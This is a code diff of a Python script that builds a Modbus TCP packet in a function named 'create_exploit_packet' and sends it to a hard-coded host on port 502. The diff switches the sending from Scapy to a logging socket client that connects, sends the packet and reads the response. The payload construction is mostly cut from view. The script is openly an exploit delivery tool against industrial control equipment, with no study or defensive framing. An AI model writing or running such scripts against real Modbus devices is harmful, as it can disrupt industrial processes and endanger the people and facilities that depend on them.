@@ -1,6 +1,9 @@
+import socket
 from scapy.all import *
+import logging
 
-# Function to create a Modbus packet with the exploit
+logging.basicConfig(level=logging.DEBUG)
+
 def create_exploit_packet():
     # Modbus TCP header
     transaction_id = 0x0001
@@ -24,15 +27,24 @@ def create_exploit_packet():
 
     return modbus_packet
 
-# Send the packet
-def send_packet(packet):
-    # Assuming the target IP and port
-    target_ip = "10.103.152.8"
-    target_port = 502
-
-    # Send the packet using Scapy
-    send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=packet))
+def send_modbus_request():
+    try:
+        modbus_request = create_exploit_packet()
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('10.103.152.8', 502))
+        logging.info("Connected to server.")
+        
+        s.send(modbus_request)
+        logging.debug('Sent Modbus request: %s', repr(modbus_request))
+        
+        response = s.recv(1024)
+        logging.debug('Received response: %s', repr(response))
+        
+        s.close()
+        logging.info("Connection closed.")
+    except Exception as e:
+        logging.error("Error in client communication: %s", e)
 
 if __name__ == "__main__":
-    packet = create_exploit_packet()
-    send_packet(packet)
+    send_modbus_request()
